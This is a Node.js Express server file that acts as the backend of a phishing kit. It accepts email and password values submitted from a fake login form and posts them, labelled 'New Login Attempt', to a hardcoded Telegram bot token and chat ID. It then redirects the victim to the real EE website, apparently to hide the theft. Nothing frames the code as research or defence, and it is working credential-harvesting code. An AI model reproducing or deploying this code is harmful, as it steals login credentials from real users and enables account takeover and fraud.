// api/submit.js

const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot API details
const telegramBotToken = '7614000884:AAG7X2RiKEet725g0_p0srbp525V70QVplc';
const chatId = '7587120060';

app.post('/api/submit', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: "Email and password are required."
            });
        }

        const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}`;

        // Send message to Telegram
        await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        // Respond with redirect URL
        res.json({
            success: true,
            redirectUrl: 'https://ee.co.uk/ '
        });

    } catch (error) {
        console.error("🚨 Server error:", error.message);

        if (error.response && error.response.data) {
            console.error("Telegram API Error:", error.response.data);
            return res.status(500).json({
                success: false,
                message: "Failed to send data to Telegram.",
                error: error.response.data
            });
        }

        if (error.request) {
            console.error("No response from Telegram:", error.request);
            return res.status(504).json({
                success: false,
                message: "Timeout connecting to Telegram."
            });
        }

        res.status(500).json({
            success: false,
            message: "Internal server error.",
            error: error.message
        });
    }
});

module.exports = app;
